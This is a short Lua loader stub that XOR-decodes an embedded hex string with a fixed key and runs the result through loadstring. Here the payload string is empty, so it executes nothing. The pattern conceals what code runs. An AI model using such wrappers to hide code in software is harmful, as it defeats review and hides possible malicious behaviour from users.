local k={208,122,132,108,227,46,202,22,1,142,53,197,125,216,246,65,171,247,19,81,106,144,20,235,78,61,10,104,118,207,12,150}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
